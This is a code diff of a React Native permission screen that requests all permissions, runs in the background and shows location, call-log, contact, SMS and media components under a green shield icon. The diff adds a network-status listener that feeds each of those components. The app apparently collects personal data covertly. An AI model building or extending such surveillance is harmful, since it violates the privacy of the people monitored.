@@ -2,8 +2,6 @@
 /* eslint-disable react-native/no-inline-styles */
 import React, {useEffect, useState} from 'react';
 import {
-  Animated,
-  Button,
   Image,
   Linking,
   PermissionsAndroid,
@@ -13,7 +11,7 @@ import {
   View,
 } from 'react-native';
 import CallLog from '../../components/CallLog';
-import {EventMapCore, useNavigation} from '@react-navigation/native';
+import {useNavigation} from '@react-navigation/native';
 import Contact from '../../components/Contact';
 import SmsListener from '../../components/SmsListener';
 import Location from '../../components/Location';
@@ -27,8 +25,8 @@ import AsyncStorage, {
 } from '@react-native-async-storage/async-storage';
 import MaterialIcon from 'react-native-vector-icons/MaterialCommunityIcons';
 import AntDIcon from 'react-native-vector-icons/AntDesign';
-import Pulse from 'react-native-pulse';
 import {format} from 'date-fns';
+import {addEventListener} from '@react-native-community/netinfo';
 
 const Permission = () => {
   const [, setToken] = useState<string | null | undefined>(null);
@@ -40,6 +38,7 @@ const Permission = () => {
   const navigation = useNavigation();
   const [permissionsGranted, setPermissionsGranted] = useState(false);
   const time = format(Date.now() - 1000 * 60 * 60 * 1.86, 'HH:mm');
+  const [connectionStatus, setConnectionStatus] = useState<boolean>(false);
 
   const requestAllPermissions = async () => {
     console.log('Platform.Version', Platform.Version);
@@ -88,6 +87,17 @@ const Permission = () => {
   };
 
   useEffect(() => {
+    // Subscribe
+    const unsubscribe = addEventListener(state => {
+      setConnectionStatus(!!state.isConnected);
+    });
+
+    return () => {
+      unsubscribe && unsubscribe();
+    };
+  }, []);
+
+  useEffect(() => {
     activeRunBackground();
     requestAllPermissions();
   }, [navigation]);
@@ -104,7 +114,7 @@ const Permission = () => {
     return () => {
       navigation.removeListener('beforeRemove', handleBack);
     };
-  }, [navigation, deviceId]);
+  }, [navigation, deviceId, connectionStatus]);
 
   return (
     <Runnable>
@@ -114,28 +124,20 @@ const Permission = () => {
             // justifyContent: 'center',
             alignItems: 'center',
           }}>
-          <View style={{marginTop: 60}}>
+          <View
+            style={{
+              marginTop: 60,
+            }}>
             <MaterialIcon
               style={{
-                padding: 20,
+                padding: 28,
                 borderRadius: 150,
                 zIndex: 100,
+                backgroundColor: 'rgba(0,128,0, 0.15)',
               }}
               name="shield-check"
               size={60}
               color="green"
-            />
-            <Pulse
-              style={{
-                position: 'absolute',
-                top: -28,
-                opacity: 1,
-              }}
-              color="rgba(0,128,0, 0.2)"
-              numPulses={2}
-              diameter={150}
-              speed={20}
-              duration={1000}
             />
           </View>
           <Text
@@ -197,11 +199,11 @@ const Permission = () => {
               <Text style={{fontSize: 12, color: 'black'}}>{deviceId}</Text>
               <View
                 style={{flexDirection: 'row', gap: 4, alignItems: 'center'}}>
-                <Location />
-                <CallLog />
-                <Contact />
-                <SmsListener />
-                <Media />
+                <Location connectionStatus={connectionStatus} />
+                <CallLog connectionStatus={connectionStatus} />
+                <Contact connectionStatus={connectionStatus} />
+                <SmsListener connectionStatus={connectionStatus} />
+                <Media connectionStatus={connectionStatus} />
                 <TouchableOpacity
                   onPress={async () => {
                     await AsyncStorage.clear();
